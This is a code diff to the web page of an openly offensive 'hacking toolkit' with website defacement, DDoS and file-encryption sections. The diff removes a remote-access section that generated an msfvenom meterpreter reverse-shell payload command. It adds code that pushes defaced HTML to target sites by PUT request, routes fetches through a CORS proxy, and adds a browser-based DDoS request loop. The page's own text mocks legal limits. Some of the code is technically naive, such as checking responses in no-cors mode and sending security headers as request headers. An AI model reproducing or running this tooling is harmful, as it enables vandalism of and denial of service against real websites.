@@ -338,8 +338,7 @@
          <li onclick="showSection('ddos')">DDoS Tool</li>
          <li onclick="showSection('encryption')">File Encryption Tool</li>
          <li onclick="showSection('reporting')">Reporting</li>
-         <li onclick="showSection('remote')">Remote Access Tool</li>
-     </ul>
+          </ul>
  </div>
  
 
@@ -402,15 +401,6 @@
          </section>
  
 
-         <!-- Remote Access Tool (RAT) -->
-         <section id="remote" style="display: none;">
-             <h2>Remote Access Tool (RAT)</h2>
-             <p>Gain remote control over a target machine. Use responsibly... or exploit the fuck out of it. <a href="#" onclick="openModal('remote-info')">Learn more</a></p>
-             <input type="text" id="rat-ip" placeholder="Target IP Address">
-             <input type="number" id="rat-port" placeholder="Port">
-             <button onclick="generatePayload()">Generate Payload</button>
-             <p>Payload Instructions: <span id="payload-instructions"></span></p>
-         </section>
  
 
          <p class="disclaimer">Noodles Inc. is NOT responsible for any misuse of this toolkit. Use at your own risk, you dumbass.</p>
@@ -473,21 +463,6 @@
  </div>
  
 
- <div id="remote-info" class="modal">
-     <div class="modal-content">
-         <span class="close" onclick="closeModal('remote-info')">&times;</span>
-         <h2>Remote Access Tool (RAT) Information</h2>
-         <p>The Remote Access Tool (RAT) allows you to gain control over a target machine remotely. This tool can be used for legitimate purposes such as remote administration or technical support, but it can also be misused for malicious activities like data theft or system compromise. </p>
-         <h3>How it Works:</h3>
-         <ul>
-             <li><b>Target IP Address:</b> Enter the IP address of the target machine.</li>
-             <li><b>Port:</b> Specify the port to use for the remote connection.</li>
-             <li><b>Generate Payload:</b> Create a malicious payload (executable file) that needs to be executed on the target machine.</li>
-             <li><b>Payload Instructions:</b> Instructions on how to deploy and execute the payload on the target machine.</li>
-         </ul>
-         <p><b>Disclaimer:</b> Misuse of this tool can lead to severe legal consequences. Use responsibly and only on machines you own or have explicit permission to access... or don't, I'm not the morality police.</p>
-     </div>
- </div>
  
 
  <div class="log-container">
@@ -530,7 +505,7 @@
  
 
      function showSection(sectionId) {
-         const sections = ['defacement', 'ddos', 'encryption', 'reporting', 'remote'];
+         const sections = ['defacement', 'ddos', 'encryption', 'reporting'];
          sections.forEach(id => {
              document.getElementById(id).style.display = 'none';
          });
@@ -600,7 +575,7 @@
      }
  
 
-     function applyDefacement() {
+   function applyDefacement() {
          const url = document.getElementById('defacement-url').value;
          const code = document.getElementById('defacement-code').value;
          if (!url) {
@@ -611,9 +586,13 @@
          logAction(`Attempting to deface: ${url} with code.`);
  
 
-         fetch(url, {
+         // CORS Anywhere Proxy
+         const corsProxy = 'https://corsproxy.io/?';
+         const targetUrl = corsProxy + encodeURIComponent(url);
+ 
+
+         fetch(targetUrl, {
              method: 'GET',
-             mode: 'cors',
              headers: {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                  'Referer': 'https://www.google.com/'
@@ -642,8 +621,34 @@
 
              const modifiedHtml = new XMLSerializer().serializeToString(doc);
              document.getElementById('defacement-preview').innerHTML = modifiedHtml;
-             alert('Defacement applied. Preview updated.');
-             logAction('Defacement applied. Preview updated.');
+ 
+
+             // Attempt to write the defaced content to the target site
+             fetch(url, {
+                 method: 'PUT', // or PATCH, depending on the server's configuration
+                 mode: 'no-cors',
+                 headers: {
+                     'Content-Type': 'text/html',
+                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+                     'Referer': 'https://www.google.com/'
+                 },
+                 body: modifiedHtml
+             })
+             .then(response => {
+                 if (response.ok) {
+                     alert('Defacement applied and pushed to the target site. Preview updated.');
+                     logAction('Defacement applied and pushed to the target site. Preview updated.');
+                 } else {
+                     console.error('Failed to push defacement to the target site. Status:', response.status);
+                     alert('Defacement applied to preview, but failed to push to the target site. Check console.');
+                     logAction(`Defacement applied to preview, but failed to push to the target site. Status: ${response.status}`);
+                 }
+             })
+             .catch(error => {
+                 console.error('Error pushing defacement to website:', error);
+                 alert('Defacement applied to preview, but failed to push to the target site. Check console.');
+                 logAction(`Error pushing defacement to website: ${error}`);
+             });
          })
          .catch(error => {
              console.error('Error defacing website:', error);
@@ -658,6 +663,19 @@
      let ddosStartTime;
      let isDDoSRunning = false;
      let useTorProxy = false;
+     let attackerIP = null;
+ 
+
+     function getAttackerIP() {
+         $.getJSON("https://api.ipify.org?format=json", function(data) {
+             attackerIP = data.ip;
+             console.log("Attacker's IP: " + attackerIP);
+             logAction("Attacker's IP: " + attackerIP);
+         });
+     }
+ 
+
+     getAttackerIP();
  
 
      function toggleTorProxy() {
@@ -711,6 +729,9 @@
                      url: targetUrl,
                      type: 'GET',
                      mode: 'no-cors',
+                     headers: {
+                         'X-Attacker-IP': attackerIP
+                     },
                      success: function() {
                          console.log(`DDoS: Sent request to ${url}`);
                          logAction(`DDoS: Sent request to ${url}`);
@@ -818,24 +839,6 @@
      }
  
 
-     // Remote Access Tool (RAT)
-     function generatePayload() {
-         const ipAddress = document.getElementById('rat-ip').value;
-         const port = document.getElementById('rat-port').value;
- 
-
-         if (!ipAddress || !port) {
-             alert("Enter target IP address and port.");
-             return;
-         }
- 
-
-         // Generate a malicious payload (this is a simplified example and may not work in real-world scenarios)
-         const payload = `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ipAddress} LPORT=${port} -f exe -o payload.exe`;
-         document.getElementById('payload-instructions').textContent = `Run this command on your system: ${payload}`;
-         console.warn(`Payload generated: ${payload}`);
-         logAction(`Payload generated: ${payload}`);
-     }
  
 
      // Modal Functions
@@ -923,6 +926,24 @@
          },
          "retina_detect": true
      });
+ 
+
+     //Security Headers
+     function setSecurityHeaders() {
+         $.ajaxSetup({
+             beforeSend: function(xhr) {
+                 xhr.setRequestHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.ipify.org;");
+                 xhr.setRequestHeader("X-Frame-Options", "DENY");
+                 xhr.setRequestHeader("X-XSS-Protection", "1; mode=block");
+                 xhr.setRequestHeader("X-Content-Type-Options", "nosniff");
+                 xhr.setRequestHeader("Referrer-Policy", "strict-origin-when-cross-origin");
+             }
+         });
+         console.warn("Security Headers set.");
+         logAction("Security Headers set.");
+     }
+ 
+
  </script>
  
 
